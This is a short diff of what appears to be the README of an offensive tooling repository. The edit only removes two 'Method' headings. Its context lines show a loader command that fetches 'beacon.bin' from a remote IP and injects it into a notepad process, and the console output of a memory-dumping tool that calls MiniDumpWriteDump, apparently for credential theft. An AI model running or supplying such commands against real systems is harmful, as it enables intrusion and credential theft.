@@ -99,7 +99,6 @@ C:\>KarenLdr.exe -u "https://192.168.231.128:443/beacon.bin" -t notepad -p 9524 
 
 ## KarenDumpedMi
 ```
-**Method 1:**
 C:\>KarenDumpedMi.exe
 
      _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
@@ -126,7 +125,6 @@ C:\>KarenDumpedMi.exe
     |-> Successfully Called MiniDumpWriteDump()
     |-> COMPLETED! You can now parse karen.dmp!
     
-**Method 2:**
 C:\>KarenDumpedMi.exe
 
      _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
